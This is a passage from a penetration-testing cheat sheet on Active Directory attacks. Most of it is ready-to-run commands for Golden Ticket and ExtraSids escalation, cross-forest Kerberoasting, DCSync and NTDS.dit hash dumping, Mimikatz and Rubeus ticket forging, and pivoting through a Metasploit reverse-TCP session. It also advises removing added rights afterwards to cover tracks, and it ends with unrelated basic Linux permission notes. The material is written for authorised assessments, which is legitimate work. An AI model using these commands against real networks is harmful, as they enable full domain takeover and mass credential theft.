impacket-lookupsid child.domaincontroller.local/username@x.x.x.x | grep "Domain SID"

```
**3. The Name of a Target User in the Child Domain:** This user does not need to exist to create a Golden Ticket. This can be an arbitrary name. 

**4. The FQDN of the Child Domain:** This should already be known, as the attacker should be on the child domain when conducting this attack

**5. The SID of the Enterprise Admins Group of the Root Domain:** impacket-lookupsid can again be used, but in this case, the IP address of the parent domain controller should be specified. Grab the Domain SID and attach the Enterprise Admins RID, so the format would look like `S-1-5-21-Domain_SID-Group_RID`
```bash
impacket-lookupsid child.domaincontroller.local/username@x.x.x.x | grep -B12 "Enterprise Admins"

```
Once all the data points are gathered, the attack can be conducted. Use impacket-ticketer to construct the Golden Ticket; the ticket will be valid to access resources in the child domain (-domain-sid) and the parent domain (-extra-sid)
```bash
impacket-ticketer -nthash NT_HASH_OF_KRBTGT -domain CHILD.DOMAINCONTROLLER.LOCAL -domain-sid SID-OF-THE-CHILD-DOMAIN  -extra-sid SID-OF-PARENT-DOMAIN fake_user

```
The ticket will be saved to the attack host as a credential cache (ccache) file, which is used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts:
```bash
export KRB5CCNAME=fake_user.ccache 

```
Now, try to authenticate to the parent domain's domain controller using impacket-psexec. If successful, the attacker will obtain a SYSTEM shell on the target domain controller:
```bash
impacket-psexec CHILD.DOMAINCONTROLLER.LOCAL/fake_user@hostname.parent_domain_controller.local -k -no-pass -target-ip x.x.x.x

```
Instead of going through this entire process, impacket-raiseChild can be used to automate the process of escalating from the child domain to the parent domain. Only an administrative user's credentials on the child domain, the FQDN of the child domain, and the IP address of the parent domain need to be known. This tool will do the rest and authenticate to the parent domain's domain controller via impacket-psexec if the `-target-exec` flag is specified as SYSTEM; however, it is important to note that this script, and similar scripts may trigger the AV or EDR:
```bash
impacket-raiseChild -target-exec x.x.x.x CHILD.DOMAIN.LOCAL/admin_childdomain_user

```
<center>

**<u>Cross-Forest Trust Abuse (Kerberoasting & Hunting Foreign Group Membership)</u>**

</center>

**`Kerberoasting`**

If Kerberoasting across a forest trust is possible in the environment, impacket-GetUserSPNs can be used. To do this, credentials for a user that can be authenticated into the other domain (domain B) and the `-target-domain` flag must be specified in the command.
* If Kerberoasting can be done across a trust, but nothing else can be done in the current domain, it could be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. 

First, get user SPNs from the targeted domain. A user in one of the domains (Domain A in this case) must be compromised:
```bash
impacket-GetUserSPNs -target-domain DOMAIN_B_CONTROLLER.LOCAL DOMAIN_A_CONTROLLER.LOCAL/username

```
If an account is yielded, rerun the same command with the `-request` flag to get the TGS ticket:
```bash
impacket-GetUserSPNs -request -target-domain DOMAIN_B_CONTROLLER.LOCAL DOMAIN_A_CONTROLLER.LOCAL/username -outputfile cross_forest_hash

```
Now, attempt to crack the hash with Hashcat. If it cracks, also check to see if the account exists in the current domain (Domain A in this case), and if it suffers from password reuse:
```bash
hashcat -m 13100 cross_forest_hash /path/to/wordlist

```
**`Hunting Foreign Group Membership with Bloodhound-python`**

Sometimes, there are users or admins from one domain as members of a group in another domain. Since the Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in Domain B when dealing with a **bidirectional forest trust relationship.** This can be quickly determined via BloodHound, as it can be used to collect data from multiple domains and ingested into the GUI tool to search for these relationships. 

If the attacking Linux machine does not have DNS configured, the `resolv.conf` file needs to be edited to effectively run BloodHound-python because it requires a DNS hostname for the target domain controller instead of an IP address:
```bash
sudo vim /etc/resolv.conf

domain DOMAIN_A_CONTROLLER.LOCAL    #domain of the targeted domain
nameserver x.x.x.x                  #IP address of the targeted domain

```
Once this is edited, run the BloodHound ingestor against the target domain and then create 1/2 zip files to upload into the BloodHound GUI:
```bash
bloodhound-python -d DOMAIN_A_CONTROLLER.LOCAL -dc HOSTNAME_OF_DC -c All -u username -p password

zip -r domain_a.zip *.json

```
The same needs to be done for the second domain:
```bash
sudo vim /etc/resolv.conf

domain DOMAIN_B_CONTROLLER.LOCAL    #domain of the targeted domain
nameserver x.x.x.x                  #IP address of the targeted domain

```
Once this is edited, run the BloodHound ingestor against the target domain and then create 2/2 zip files to upload into the BloodHound GUI:
```bash
bloodhound-python -d DOMAIN_B_CONTROLLER.LOCAL -dc HOSTNAME_OF_DC.DOMAIN_B_CONTROLLER.LOCAL -c All -u username@domain_a_controller.local -p password

zip -r domain_b.zip *.json
```
After uploading each set of data, click on `Users with Foreign Domain Group Membership` under the Analysis tab and select the source domain as DOMAIN_A_CONTROLLER.LOCAL. This will show foreign group membership on Domain B. 

<a id="activedirattackingdomaintrustswindows"></a>

##### **`Attacking Domain Trusts (Windows)`**

<center>

**<u>Child -> Parent Trusts (ExtraSids Attack)</u>**

</center>

The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added tot he new user's SID history attribute, ensuring that the user can still access resources in the original domain. SID history is intended to work across domains, but can work in the same domain. **Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of any account they control.** When logging in with this account, all of the SIDs associated with the account are added to the user's token. 
* This token is used to determine what resources the account can access. 
   * If the SID of a domain admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos TGT, which will allow the attacker to authenticate as any account in the domain

<br>

**`ExtraSids Attack: Mimikatz`**

This attack allows for the compromise of a parent domain oce the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust; therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. 
* Essentially, the attacker is creating a Golden Ticket from the compromised child domain to compromise the parent domain. 
   * In this case, they leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contian the SID for the Enterprise Admins group, which will give them full access to the parent domain without actually being part of the group. 

To perform this attack after compromising a child domain, the attacker needs the following to perform the attack with Mimikatz:

**1. The KRBTGT Hash for the Child Domain:** Conduct the Golden Ticket attack on the child domain via Mimikatz. If the child domain is already compromised, log in as a domain admin or a similar account, and perform the following DCSync attack to obtain the NT hash for the KTBTGT account as follows.
```powershell
lsadump::dcsync /user:CHILDDOMAIN\krbtgt

```
**2. The SID for the Child Domain:** Use PowerView's `Get-DomainSID` function to get the SID for the child domain. This value can also be seen in step 1s output
```powershell
Import-Module .\PowerView.ps1

Get-DomainSID

```
**3. The Name of a Target User in the Child Domain:** This user does not need to exist to create a Golden Ticket. This can be an arbitrary name. 

**4. The FQDN of the Child Domain:** This should already be known, as the attacker should be on the child domain when conducting this attack

**5. The SID of the Enterprise Admins Group of the Root Domain:** Use PowerView's `Get-DomainGroup` function to obtain the SID for the Enterprise Admins group in the parent domain. This can also be done with the `Get-ADGroup` cmdlet with the second command:
```powershell
Get-DomainGroup -Domain DOMAINCONTROLLER.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

Get-ADGroup -Identity "Enterprise Admins" -Server "DOMAINCONTROLLER.LOCAL".

```
For PoC, confirm that there is no access to the file system of the domain controller in the parent domain by running the following command in PowerShell. Access should be denied by this point:
```powershell
ls \\hostname.domaincontroller.local\c$

```
Now, with the gathered data, use Mimikatz to create a GOlden Ticket to access all resources within the parent domain
```powershell
mimikatz.exe

kerberos::golden /user:fake_user /domain:CHILD.DOMAINCONTROLLER.LOCAL /sid:SID-OF-THE-CHILD-DOMAIN /krbtgt:NT_HASH_OF_KRBTGT /sids:SID-OF-PARENT-DOMAIN /ptt

```
If this command works, this command creates a Golden Ticket for the fake user. Confirm that the Kerberos ticket for the fake user is residing in memory by typing `klist` in PowerShell. This would show a value under *Cached Tickets* for the fake user. From here, it is possible to access any resources within the parent domain, which can be compromised in several ways:
```powershell
ls \\hostname.domaincontroller.local\c$

```
**`ExtraSids Attack: Rubeus`**

With Rubeus, first confirm that there is no access to the file system of the domain controller in the parent domain by running the following command in PowerShell. Access should be denied by this point:
```powershell
ls \\hostname.domaincontroller.local\c$

```
Similar to the Mimikatz attack route, the same information would be needed (the KRBTGT hash for the child domain, the SID for the child domain, the name of a target user in the child domain, the name of a target user in the child domain, the FQDN of the child domain, and the SID of the Enterprise Admins group of the root domain); however, the commands are different. The `/rc4` flag is the NT hash for the KRBTGT account and the `/sids` flag creates the Golden Ticket with the same rights as members of the Enterprise Admins group in the parent domain:
```powershell
.\Rubeus.exe golden /rc4:NT_HASH_OF_KRBTGT /domain:CHILD.DOMAINCONTROLLER.LOCAL /sid:SID-OF-THE-CHILD-DOMAIN  /sids:SID-OF-PARENT-DOMAIN /user:fake_user /ptt

```
Confirm that the Kerberos ticket for the fake user is residing in memory by typing `klist` in PowerShell. This would show a value under *Cached Tickets* for the fake user. Finally, test this access by performing a DCSync attack against the parent domain, targeting a Domain Admin user in Mimikatz; however, when dealing with multiple domains and the target domain is not the same as the user's domain, it is necessary to specify the exact domain to perform the DCSync operation on the particular domain controller:
```powershell
.\mimikatz.exe

lsadump::dcsync /user:DOMAINCONTROLLER\admin_user

lsadump::dcsync /user:DOMAINCONTROLLER\admin_user /domain:DOMAINCONTROLLER.LOCAL    #multiple domains, target not the user's domain

```
<center>

**<u>Cross-Forest Trust Abuse (Kerberoasting, Admin Password Reuse, and Group Membership)</u>**

</center>

**`Cross-Forest Kerberoasting`**

Kerberos attacks, such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. **When the attacker is in a domain with either an inbound or bidirectional domain/forest trust,** they can likely perform various attacks to gain a foothold. 

Sometimes, an attacker will not be able to escalate privileges in their domain, but can instead obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains. 

PowerView can be used to enumerate accounts in a target domain that have SPNs associated with them:
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -SPN -Domain DOMAIN_B.CONTROLLER | select SamAccountName

```
If any users are output, check to see what group(s) the account is a member of in the target domain. This is useful because if the account can be successfully Kerberoasted (i.e., if the hash can be cracked), the attacker can gain whatever privileges associated with the compromised accounts on the target domain:
```powershell
Get-DomainUser -Domain DOMAIN_B.CONTROLLER -Identity username |select samaccountname,memberof

```
Now, try to Kerberoast the user across the trust via Rubeus:
```powershell
.\Rubeus.exe kerberoast /domain:DOMAIN_B.CONTROLLER /user:username /nowrap

```
Once the hash is output, put it in a file on a Linux attack machine and run it through Hashcat with a strong wordlist. If this works, access has been expanded to fully control two domains by abusing the authentication direction and set up of the bidirectional forest trust:
```bash
hashcat -m 13100 cross_forest_hash.txt /path/to/wordlist

```
**`Admin Password Re-Use & Group Membership`**

If there is a **bidirectional forest trust** managed by admins from the same company, and if Domain A can be compromised by obtaining cleartext passwords or NT hashes for either built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, check for password reuse across the two forests. 

Also, there may be users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals (processes) from outside its forest. In this case, a Domain/Enterprise Admin from Domain A may be a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If this admin user in Domain A can be compromised, full administrative access to Domain B will be gained based on group membership. 

To enumerate groups with users that do not belong to the domain (foreign group membership), PowerView's `Get-DomainForeignGroupMember` can be used. To get the MemberName in a readable format, the second command can be run to convert it:
```powershell
Get-DomainForeignGroupMember -Domain DOMAIN_B.CONTROLLER

Convert-SidToName MemberName_SID_Value

```
Now, verify access using the `Enter-PSSession` cmdlet to connect over WinRM (if WinRM is allowed for the found user):
```powershell
Enter-PSSession -ComputerName HOSTNAME.DOMAIN_B_CONTROLLER.LOCAL -Credential DOMAIN_A\username

```
**`SID History Abuse`**

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust
* If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.

* If SID filtering is not enabled when a migration is made and the user has administrative privileges (or any type of exploitable rights like ACE entries or access to shares) in Forest A, then they will retain their administrative rights/access in Forest A while being a member of the new domain in Forest B

<a id="activedirmiscmisconfigs"></a>

#### **`Miscellaneous Misconfigurations`**

**<u>Exchange Related Group Membership</u>**

A default installation of MS Exchange within an AD environment (with no split administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). 

The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. 

The Exchange group Organization management is another group (the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions. 

If an Exchange server can be compromised, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce many of cleartext credentials or NTLM hashes. This is due to users logging in to OWA and Exchange caching their credentials in memory after a successful login. 

<br>

**<u>PrivExchange</u>**

This attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP. 

The Exchange service runs as SYSTEM and is over-privileged by default, as it has WriteDacl privileges on the domain pre-2019 Cumulative Update. This flaw can be leveraged to relay to LDAP and dump the domains NTDS daabase. If it is not possible to relay to LDAP, this can be lveraged to relay and authenticate to other hosts within the domain. This attack will lead directly to Domain Admin with any authenticated domain user account. 

<br>

**<u>Printer Bug</u>**

This is a flaw in the MS-RPRN protocol. This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be lveraged to relay to LDAP and grant the attacker account DCSync privileges to retrieve all password hashes from AD. The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under the attacker's control, thus giving them privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a domain controller in a partner domain/forest, provided there is administrative access to a domain controller in the first forest/domain already, and the trust allows TGR delegation, which is not by default anymore. 

[Get-SpoolStatus](https://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) from cube0x0 can be used (web archive), or [Get-SpoolStatus](https://github.com/NotMedic/NetNTLMtoSilverTicket) from an update repo to check for machines vulnerable to the MS-PRN printer bug:
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName HOSTNAME.DOMAIN.CONTROLLER

```
This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can enable an attack across forest trusts once one forest has been compromised. 

<br>

**<u>MS14-068</u>**

This is a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to domain admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation. 

This vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the domain administrators or other privileged groups. It can be exploited with [ms14-068.py](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or Impacket. The only defense against this attack is patching 
```bash
python ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>

```
**<u>Sniffing LDAP Credentials</u>**

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext; other times, the application has a test connection function that can be used to gather credentials by changing the LDAP IP address to that of the attack host and setting up a netcat listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to the attacking machine, often in cleartext. 

Accounts used for LDAP connections are often privileged, but if not, this could server as an initial foothold in the domain. Other times, a [full LDAP server](https://grimhacker.com/2018/03/09/just-a-printer/) is required to pull of this attack.

<br>

**<u>Enumerating DNS Records</u>**

[adidnsdump](https://github.com/dirkjanm/adidnsdump) can be used to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts is returned with non-descriptive names from tools like BloodHount. 

If all servers and workstations have a non-descriptive name, it makes it diffult to know exactly what to attack. If DNS entries in AD can be accessed, it may be possible to discover DNS records that point to a more descriptive name, which can be used to better plan out attacks. If this is run with the `-r` flag, the tool will attempt to resolve unknown records by performing an A query, which may be more useful:
```bash
adidnsdump -u domaincontroller\\user ldap://x.x.x.x

adidnsdump -u domaincontroller\\user ldap://x.x.x.x -r
```
The contents will be stored in a records.csv file:
```bash
head records.csv 

```
**<u>Password in Description Field & PASSWD_NOTREQD</u>**

Sensitive information like account passwords are sometimes found in the user account description or notes files, which can be quickly enumerated with PowerView. For large domains, it is helpful to export this data to a CSV file to review offline:
```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

```
Some domain accounts may have the `passwd_notreqd` field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). Just because this flag is set, it doesn't mean that no password is set, just that one may not be required. It is worth enumerating accounts with this flag and testing each to see if no password is required:
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

```
**<u>Credentials in SMB Shares and SYSVOL Scripts</u>**

The SYSVOL share is especially important in large organizations. There may be many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. Check to see if there are any passwords within this directory; if there are, use **CrackMapExec** and the `--local-auth flag`:
```powershell
ls \\hostname\SYSVOL\DOMAIN.CONTROLLER\scripts
```

<a id="activedirpostdomaincompromiseattacks"></a>

### **`Post-Domain Compromise Attacks`**

Once a domain is "owned," provide as much value to the client as possible by dumping the NTDS.dit and cracking the passwords, enumerating shares for sensitive information, gaining persistence, creating a domain administrator account (and deleting the account once the penetration test is complete), and creating a Golden Ticket. 

<a id="activedirpivotdomains"></a>

#### **`Pivoting Domains`**

Moving laterally between systems or domains in a network typically requires leveraging credentials, vulnerabilities, or trust relationships to gain access to the second domain controller. 

First, get the IP address of the second domain by pinging the hostname from the first domain:
```bash
ping HOSTNAME

```
If credentials are known for the second domain controller, either by enumeration, exploitation, or password reusue, native PowerShell tools can be leveraged to complete the pivot:
```powershell
$user = "DOMAINCONTROLLER\username"
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ($user, $Password)

Enter-PSSession -ComputerName "HOSTNAME_B.DOMAINCONTROLLER.LOCAL" -Credential $creds

```
Once this is done, an interactive PowerShell session should open on the second domain. Opening a GUI session via RDP or WinRM may be a bit more complicated, however. If this needs to be done because the user is effectively chrooted in a directory, cannot execute commands, or preference, scan for open ports while in this session or via nmap to check to see if **RDP (port 3389)** or **WinRM (port 5985)** are open:
```powershell
Get-NetTCPConnection | ? {$_.State -eq 'Listen'}
```
```bash
proxychains nmap -p 3389,5985  -Pn -sT -v x.x.x.x     #from attacking linux machine

```
**If RDP or WinRM are open, continue with the port forwarding process.** To make this process easier, access the first domain on **metasploit** by using exploit/windows/smb/psexec or exploit/multi/handler with the corresponding payload: windows/meterpreter/reverse_tcp. 

Before using the following module, make sure that the `/etc/proxychains.conf` file has the socks4 address set to 127.0.0.1 9050. Now, background the session and use **auxiliary/server/socks_proxy** with the following settings:
```bash
set SRVPORT 9050
set SRVHOST 0.0.0.0 
set version 4a       #use 5 if this does not work
run

```
After doing this, have the sock proxy route all traffic through the meterpreter session by using the **post/multi/manage/autoroute** module. The subnet needs to be set to that of the second domain (the one that is to be pivoted); subnets are most commonly /24:
```bash
set SESSION x        #that of the backgrounded metasploit session
set SUBNET x.x.x.0
run

```
Go back to the session, and while in the meterpreter shell, specify the IP address (not the subnet) of the second domain after the `-r` flag with the following commands **for RDP:**
```bash
sessions -i x

portfwd add -l 1234 -p 3389 -r x.x.x.x

```
Now, access the second domain via RDP. The xfreerdp command varies based on the version, but for xfreerdp3, the IP address of the attacking machine (local host) should be specified:
```bash
xfreerdp /v:localhost:1234 /u:"DOMAIN_A_CONTROLLER\username" /p:password /dynamic-resolution /drive:Tools,/path/to/exploit/tools

xfreerdp3 /v:x.x.x.x:1234 /u:"DOMAIN_A_CONTROLLER\username" /p:password /dynamic-resolution /drive:Tools,/path/to/exploit/tools

```
This process can be done several times, but the local port (after the `-l` flag) must be changed every time to an ephemeral port. In these cases, go back to the session, and while in the meterpreter shell, specify the IP address (not the subnet) of the next domain after the `-r` flag with the following commands **for WinRM:**
```bash
sessions -i x

portfwd add -l 5678 -p 5985 -r x.x.x.x

```
To access the next domain via WinRM, use the following command format:
```bash
evil-winrm -i localhost --port 5678 -u username -H NT_hash
```
If both ports (3389 and 5985) are open, use WinRM if there is only a hash for the account and if CLI is preferred, and RDP if cleartext credentials are known and if GUI is preferred.

<a id="activedirdumpingntds"></a>

#### **`Dumping the NTDS.dit`**

NTDS.dit is a database used to store AD data. This contains user information, group information, security descriptors, and password hashes. Again, `impacket-secretsdump` can be used with a known domain admin to dump NTDS.dit:
```bash
impacket-secretsdump DOMAIN.CONTROLLER/username:'password'@x.x.x.x -just-dc-ntlm

```
This will use the DRSUAPI method to get NTDS.dit secrets. Gather the NT portion of the yielded hashes for every account that is to be cracked, put them all in a file, and then run then crack them in hashcat with module 1000:
```bash
hashcat -m 1000 ntds.txt <wordlist> --show

```
It is important to note that PC passwords are not of high value, so they cracking them is not necessary. It is more important to focus on user accounts. 

<a id="activedirgoldenticketattks"></a>

#### **`Golden Ticket Attacks`**

The `krbtgt` service account represents the **Kerberos Ticket Granting Ticket** account. When this account is comprimised, the domain will be technically owned because it tickets can be granted to whoever. An attacker can request access to any resource or system on the domain with this account, and Golden Tickets can be used to get complete access to every machine. 

To replicate this attack, krbtgt's NTLM hash and the domain's SID are required. The domain's SID is the long string separated by 6 dashes, generated by the following command:
```powershell
privilege::debug

lsadump::lsa /inject /name:krbtgt

```
Once both are obtained, a Golden Ticket can be generated. For the ID, use the RID of the specified account. The final flag, ptt, represents pass-the-ticket, which is used to pass the ticket to another session; therefore, **another command prompt must be opened after the final command is input:**
```powershell
kerberos::golden /user:Administrator /domain:DOMAIN.CONTROLLER /sid:<SID-VALUE> /krbtgt:<NTLM hash> /id:500 /ptt

misc::cmd

```
From the secondary terminal, the Golden Ticket can be used anywhere on the machine. Download the Windows version of [psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) and use it on the compromised machine. To get a shell of another user, the following can be done with psexec.exe
```powershell
psexec.exe \\username cmd.exe
```

<a id="activedirdcsync"></a>

#### **`DCSync`**

DCSync is a technique for stealing the AD password database by using the built-in **Directory Replication Service Remote Protocol (DRSR),** which is used by domain controllers to replicate domain date. This allows an attacker to mimic a domain controller to retrieve user NTLM password hashes. Essentially, this attack requests a domain controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD which allows for the replication of secret data. 

To perform this attack, an attacker must have control over an account that has domain-level replication rights (a user within the `Replicating Directory Changes` and `Replicating Directory Changes All` permissions set). Domain/Enterprise Admins and default administrators have this right by default, but some accounts may have been given those rights through ACL abuse or misconfiguration. This attack moves back and forth between a Windows and Linux attack host, but it can be done solely from Windows using a version of `secretsdump.exe` for Windows. 

First, find a user that has **DCSync privileges in the domain.** This can be done by enumerating the ACL of the user, and determining whether they have the aforementioned permissions set. A user's replication privileges can also be seen through ADSI Edit. During an assessment, it is common to find other accounts that have these rights, and once compromised, their access can be used to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Once a user that has been granted the replicating permissions is identified, use the `Get-DomainUser` function to view their group membership:
```powershell
Get-DomainUser -Identity username |select samaccountname,objectsid,memberof,useraccountcontrol |fl

```
PowerView can also be used to confirm that the user has the necessary permissions assigned to their account. Get the user's SID from the previous command and then check all ACLs set on the domain object using the `Get-ObjectAcl` function to get the ACLs associated with the object. The following commands search for replication rights and checks if the user (denoted as the `$sid`) possesses these rights:
```powershell
$sid= "S-I-D-S-T-R-I-N-G"

PS C:\htb> Get-ObjectAcl "DC=DOMAIN,DC=CONTROLLER" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

```
If there are certain rights over the user, such as `WriteDacl`, this privilege can also be added to a user under the attacker's control, execute the DCSync attack, and then removed to cover the tracks. **DCSync replication can be performed using Mimikatz, Invoke-DCSync, and impacket-secretsdump.**

<br>

**<u>Impacket</u>**

Running impacket-secretsdump will write all hashes to files with the prefix of the specified word next to outputfile, in this case, it will be example_hashes. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file:
```bash
impacket-secretsdump -outputfile example_hashes -just-dc DOMAINCONTROLLER/username@x.x.x.x

```
* `-just-dc-ntlm` only extracts NTLM hashes

* `-just-dc-user username` only extracts data for a specific user. 

* `-pwd-last-set` determines when each account's password was last changed

* `-history` dumps password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for the client

* `-user-status` checksif a user is disabled. NTDS data can be dumped with this flag, and then disabled users can be filtered out when providing the client with password cracking statistics 

If the created files from the `-just-dc` flag are checked, there should be three: one containing the NTLM hashes, one containing Kerberos keys, and one that contains cleartext passwords from the NTDS for any accounts set with reversible encryption enabled (rare, but these accounts are typically set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes). 
* When reversible encryption is enabled on a user account, it does not mean that the passwords are stored in cleartext; instead, they are stored using RC4 encryption. However, the decryption key is stored in the registry (Syskey) and can be extracted by a domain admin or equivalent
  * impacket-secretsdump will decrypt any passwords stored using reversible encryption while dumping the NTDS file, either as domain admin or using an attack like DCSync. This will be within the **`*.ntds.cleartext`** file
  * If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. 

Any passwords set on accounts with the reversible encryption setting enabled will be stored as such until they are changed. This can be enumerated using the `Get-ADUser cmdlet`, listed next to **Name**, or with `Get-DomainUser`, listed under **samaccountname**:
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

```
**<u>Mimikatz</u>**

Using Mimikatz, a specific user mus tbe targeted. Try to target the built-in administrator account, or the krbtgt account to create a Golden Ticket for persistence first. Also, Mimikatz must be ran in the context of the user who has DCSync privileges; `runas.exe` can be used to accomplish this:
```powershell
runas /netonly /user:DOMAINCONTROLLER\username powershell   #from cmd

runas /user:DOMAINCONTROLLER.local\username powershell
```
From the newly spawned PowerShell session, this attack can be performed as follows:
```powershell
.\mimikatz.exe

privilege::debug

lsadump::dcsync /domain:DOMAINCONTROLLER /user:DOMAINCONTROLLER\username
```

#### **`Creating/Deleting User Accounts`**

The **`adduser`** command requires sudo privileges. This command adds the user to a group with their username and creates a home directory for that user. If a user owns files outside of their home directory, the ownership and group permissions will default to an arbitrary number corresponding to the deleted user.
```bash
sudo userdel -r <Username>
```

<a id="managingpermissionsandsudousers"></a>

#### **`Managing Permissions and Sudo Users`**

The following command lists file permissions in the current directory:
```bash
ls -l

-rwxr-xr-- <Owner> <Group> <Size> <Date> <Time> <File>
```
* If another directory is in the current directory, the first `-` will be replaced by a `d` and the `<file>` will be blue to represent the directory name

* If a user can read the file but cannot write to it or execute it, they are considered **other** as they are neither in owner nor in the group. 

To change permissions on a file or a directory, the `chmod` command can be used:
```bash
chmod --- <File/Dir>
```
* In this case, each **-** in `---` is replaced by a numeric value for owner, group, and other permissions
   * **7: rwx**
   * **6: rw-**
   * **5: r-x**
   * **4: r--**
   * **3: -wx**
   * **2: -w-**
   * **1: --x**
   * **0: No permissions**

Besides adding permissions, permissions can be revoked with the same method. Even if a file or directory is in a particular user's home directory, they can still have their access revoked

When creating a new user, they will not be included in the **sudoers** file. This can be changed in the `/etc/sudoers` file. The `/etc` directory stores many configuration and administrative files. 
* By default, only the root user and users in the root group can access this file. However, a user with sudo privileges can also access this file 

Within the `/etc/sudoers` file, there are three sections of primary importance. 
1. **User privileges specification**
2. **Members of the admin group may gain root privileges**
3. **Allow members of the group sudo to execute any command**
   * Groups are denoted by the `%`. By default, the groups with sudo privileges include **%admin** and **%sudo.** 

While `/etc/sudoers` can be edited, and at some point may require modification, it is NOT recommended to use sudo to edit this file directly because it allows the user to make invalid changes. Linux relies on this file to be functional for the OS to work properly, so if the root user was removed from this file, the computer would break because the root user would be unable to run things with the appropriate permissions. Instead, the `visudo` command can be used as root.
* `visudo` is specifically designed to edit the /etc/sudoers file, so no path is needed. Just type `sudo visudo`


Once using `visudo`, there are different ways to edit the sudoers file:
```bash
root  ALL=(ALL:ALL) ALL
user  ALL=(ALL:ALL) ALL
```

<a id="linuxgroups"></a>

#### **`Groups`**

For the first created user, the OS automatically adds that user to certain groups. When another user is created, they are placed into a group with their username. 
* To determine which groups a user belongs to, the `groups` command can be performed. 
   * To determine what groups another user belongs to, `groups <User>` can be specified.

* The `id` command will provide additional group details, including the number assigned to the group by the OS
   * The `uid` yields the user ID of the logged-in user
   * The `gid` yields the group ID of any associated groups

